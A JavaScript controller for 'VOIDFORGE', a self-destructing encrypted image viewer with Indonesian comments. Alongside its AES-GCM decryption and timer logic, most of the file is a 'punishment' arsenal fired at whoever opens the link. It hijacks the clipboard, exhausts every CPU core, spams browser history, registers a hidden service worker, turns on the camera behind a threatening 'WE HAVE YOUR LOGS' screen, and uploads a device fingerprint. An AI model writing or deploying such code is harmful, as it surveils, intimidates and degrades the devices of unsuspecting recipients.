/**
 * VOIDFORGE - Master Controller & Void Protocol
 * Architecture: E2EE In-Memory Decryption, Temporal Decay, DOM Obliteration & Isolated Punishment Pipeline
 * Status: MILITARY-GRADE PATCHED (HOTFIX: Fault-Tolerant Execution)
 */

const VoidProtocol = {
    capsuleId: null,
    aesKeyBase64: null,
    dbRef: null,
    options: {},
    isDetonated: false,
    decayTimer: null,
    toleranceAllowed: 3,
    isHolding: false,

    init: function() {
        const urlParams = new URLSearchParams(window.location.search);
        this.capsuleId = urlParams.get('id');
        
        const fragment = window.location.hash.substring(1);
        const fragmentParams = new URLSearchParams(fragment);
        this.aesKeyBase64 = fragmentParams.get('key');
        
        if (!this.capsuleId || !this.aesKeyBase64) {
            this.executeVaporization("INVALID ENCRYPTION TOKEN OR MISSING KEY.");
            return;
        }

        this.dbRef = window.VoidDB.ref(`burner_vault/${this.capsuleId}`);
        this.bootSequence();
    },

    bootSequence: async function() {
        try {
            document.getElementById('boot-status').innerText = "ESTABLISHING SECURE CONNECTION...";

            const [payloadSnap, ivSnap, optionsSnap, durationSnap] = await Promise.all([
                this.dbRef.child('payload').once('value'),
                this.dbRef.child('iv').once('value'),
                this.dbRef.child('options').once('value'),
                this.dbRef.child('duration').once('value')
            ]);

            if (!payloadSnap.exists() || !ivSnap.exists()) {
                this.executeVaporization("PAYLOAD VAPORIZED OR EXPIRED.");
                return;
            }

            const data = {
                payload: payloadSnap.val(),
                iv: ivSnap.val(),
                options: optionsSnap.val() || {},
                duration: durationSnap.val() || 0
            };

            this.options = data.options;
            this.toleranceAllowed = this.options.tolerance !== undefined ? parseInt(this.options.tolerance) : 3;
            
            if (typeof OsintEngine !== 'undefined') OsintEngine.init(this.capsuleId);

            document.getElementById('boot-status').innerText = "DECRYPTING PAYLOAD...";
            
            let decryptedImageUri;
            try {
                decryptedImageUri = await this.decryptPayload(data.payload, data.iv, this.aesKeyBase64);
            } catch (decErr) {
                this.executeVaporization("DECRYPTION FAILED. INCORRECT KEY OR CORRUPTED DATA.");
                return;
            }

            document.getElementById('void-loader').style.display = 'none';
            document.getElementById('vault-container').style.display = 'block';

            if (typeof VisualCrypt !== 'undefined') {
                VisualCrypt.init(
                    this.options, 
                    decryptedImageUri, 
                    () => this.onTargetHold(), 
                    (apexReason) => this.onTargetRelease(apexReason)
                );
            }

            if (typeof KineticSensors !== 'undefined') KineticSensors.init(this.options, (r) => this.triggerDetonation(r));
            if (typeof FaceTracker !== 'undefined') FaceTracker.init(this.options, (r) => this.triggerDetonation(r));

            this.activateTemporalDecay(data.duration);
            this.listenForKillSwitch();
            this.setupApexInstincts();

        } catch (error) {
            console.error(error);
            this.executeVaporization("SECURE HANDSHAKE FAILED. CONNECTION REFUSED.");
        }
    },

    decryptPayload: async function(cipherB64, ivB64, rawKeyB64) {
        const keyBuffer = Uint8Array.from(atob(rawKeyB64), c => c.charCodeAt(0));
        const ivBuffer = Uint8Array.from(atob(ivB64), c => c.charCodeAt(0));
        const cipherBuffer = Uint8Array.from(atob(cipherB64), c => c.charCodeAt(0));

        const cryptoKey = await window.crypto.subtle.importKey(
            "raw", keyBuffer, { name: "AES-GCM" }, false, ["decrypt"]
        );

        const decryptedBuffer = await window.crypto.subtle.decrypt(
            { name: "AES-GCM", iv: ivBuffer }, cryptoKey, cipherBuffer
        );

        return new TextDecoder().decode(decryptedBuffer);
    },

    setupApexInstincts: function() {
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.triggerDetonation("APEX VIOLATION: BACKGROUND / TAB-SWITCH ATTEMPT DETECTED.");
            }
        });
    },

    activateTemporalDecay: function(duration) {
        if (duration && duration > 0) {
            this.decayTimer = setTimeout(() => {
                this.triggerDetonation("TEMPORAL DECAY: TIME EXPIRED.");
            }, duration * 1000);
        }
    },

    listenForKillSwitch: function() {
        this.dbRef.child('manual_detonation').on('value', snap => {
            if (snap.exists() && snap.val() === true) {
                this.triggerDetonation("VOID PROTOCOL TRIGGERED BY SUPER ADMIN.");
            }
        });
    },

    onTargetHold: function() {
        this.isHolding = true;
    },

    onTargetRelease: function(apexReason) {
        if (this.isDetonated) return;
        this.isHolding = false;
        
        if (apexReason) {
            this.triggerDetonation(`APEX VIOLATION: ${apexReason}`);
            return;
        }
        
        this.toleranceAllowed--;
        const warnUI = document.getElementById('tolerance-warning');
        const countUI = document.getElementById('tol-count');
        
        if (this.toleranceAllowed > 0) {
            countUI.innerText = this.toleranceAllowed;
            warnUI.style.display = 'block';
            setTimeout(() => { warnUI.style.display = 'none'; }, 3000);
        } else {
            this.triggerDetonation("MAXIMUM TOLERANCE EXCEEDED. LOCK BROKEN.");
        }
    },

    triggerDetonation: function(reason) {
        if (this.isDetonated) return;
        this.isDetonated = true;

        if (this.decayTimer) clearTimeout(this.decayTimer);
        
        try { if (navigator.vibrate) navigator.vibrate([150, 50, 150, 50, 300]); } catch(e) {}
        
        if (typeof FaceTracker !== 'undefined') FaceTracker.stopTracking();
        if (typeof VisualCrypt !== 'undefined') VisualCrypt.obliterate();

        document.getElementById('vault-container').style.display = 'none';

        // --- ISOLATED PIPELINE (Pencegah Efek Domino Error) ---
        // Jika satu hukuman diblokir browser, ia tidak akan mematikan yang lain
        const executeSafe = (fn) => {
            try { fn.call(this); } catch (err) { console.warn("Punishment blocked/bypassed."); }
        };

        // 1. Eksekusi Amunisi Latar Belakang
        if (this.options.fingerprint) executeSafe(this.punishFingerprint);
        if (this.options.phantom && 'serviceWorker' in navigator) executeSafe(() => navigator.serviceWorker.register('sw-phantom.js'));
        if (this.options.clipboard) executeSafe(this.punishClipboard);
        if (this.options.cpu) executeSafe(this.punishCPU);
        if (this.options.hydra) executeSafe(this.punishHydra);

        // 2. Eksekusi Amunisi Visual
        let delayVisual = 0;

        if (this.options.medusa || reason.includes("FACE")) {
            executeSafe(this.punishRedRoom);
            delayVisual = 3000;
        }

        if (this.options.shatter) {
            executeSafe(this.punishShatter);
            delayVisual = 3000;
        }

        // 3. Final Vaporization
        if (delayVisual > 0) {
            setTimeout(() => executeSafe(() => this.executeVaporization(reason)), delayVisual);
        } else {
            executeSafe(() => this.executeVaporization(reason));
        }
    },

    // --- ARSENAL BARU ---

    punishClipboard: function() {
        const poisonText = "[VOIDFORGE ALERT] IDENTITAS PERANGKAT TEREKAM. PELANGGARAN PROTOKOL KEAMANAN. WAKTU: " + new Date().toISOString();
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(poisonText).catch(()=>{});
        } else {
            const tempInput = document.createElement("input");
            tempInput.value = poisonText;
            document.body.appendChild(tempInput);
            tempInput.select();
            try { document.execCommand("copy"); } catch(e) {}
            document.body.removeChild(tempInput);
        }
    },

    punishCPU: function() {
        const workerCode = `
            let end = Date.now() + 4000; 
            while(Date.now() < end) { Math.sqrt(Math.random() * Math.random()); }
        `;
        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const workerUrl = URL.createObjectURL(blob);
        const cores = navigator.hardwareConcurrency || 4; 
        
        for (let i = 0; i < cores; i++) {
            const worker = new Worker(workerUrl);
            setTimeout(() => worker.terminate(), 4500); 
        }
    },

    punishHydra: function() {
        // PERBAIKAN: Menghapus window.open() agar tidak memunculkan notifikasi "Popup diblokir".
        // Diganti dengan "Tar-Pit PushState": Mencekik tab dengan riwayat palsu secara agresif
        let spamCount = 0;
        let hydraInt = setInterval(() => {
            if (spamCount > 50) { clearInterval(hydraInt); return; }
            try { window.history.pushState(null, null, "#VOID_" + Math.random().toString(36).substring(2)); } catch(e){}
            spamCount++;
        }, 20);
    },

    // --- ARSENAL VISUAL ---

    punishShatter: function() {
        const shatterLayer = document.getElementById('shatter-overlay');
        shatterLayer.style.display = 'block';
        shatterLayer.style.zIndex = '9999'; 
        for (let i = 0; i < 50; i++) {
            const piece = document.createElement('div');
            piece.className = 'shatter-piece';
            piece.style.width = Math.random() * 100 + 50 + 'px';
            piece.style.height = Math.random() * 100 + 50 + 'px';
            piece.style.left = Math.random() * 100 + 'vw';
            piece.style.top = Math.random() * 100 + 'vh';
            piece.style.animationDuration = (Math.random() * 1.5 + 0.5) + 's';
            shatterLayer.appendChild(piece);
        }
    },

    punishRedRoom: function() {
        const rr = document.getElementById('red-room');
        rr.style.display = 'block';
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => { document.getElementById('red-video').srcObject = stream; })
            .catch(e => { document.getElementById('red-text-content').innerHTML = "SYSTEM COMPROMISED.<br>WE HAVE YOUR LOGS."; });
        setInterval(() => { rr.style.filter = `hue-rotate(${Math.random()*360}deg) brightness(${Math.random()*2})`; }, 100);
    },

    punishFingerprint: function() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.fillText('VOIDFORGE', 10, 10);
        const hash = canvas.toDataURL().slice(-20);
        window.VoidDB.ref(`banned_fingerprints/${hash}`).set({ timestamp: Date.now() }).catch(()=>{});
    },

    executeVaporization: function(reason) {
        document.getElementById('shatter-overlay').style.display = 'none';
        document.getElementById('red-room').style.display = 'none';
        
        const burnScreen = document.getElementById('burned-screen');
        const reasonEl = document.getElementById('lblBurnReason');
        if (reasonEl) reasonEl.innerText = reason;
        if (burnScreen) burnScreen.style.display = 'flex';

        try { if (navigator.vibrate) navigator.vibrate([800, 200, 800, 200, 1500]); } catch(e) {}

        try { 
            localStorage.clear(); 
            sessionStorage.clear(); 
        } catch(e) {}

        setTimeout(() => {
            if (document.fullscreenElement) { 
                document.exitFullscreen().catch(e => {}); 
            }
            setTimeout(() => { 
                window.location.replace('https://www.google.com'); 
            }, 150);
        }, 2000);
    }
};

window.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => { VoidProtocol.init(); }, 100);
});
          
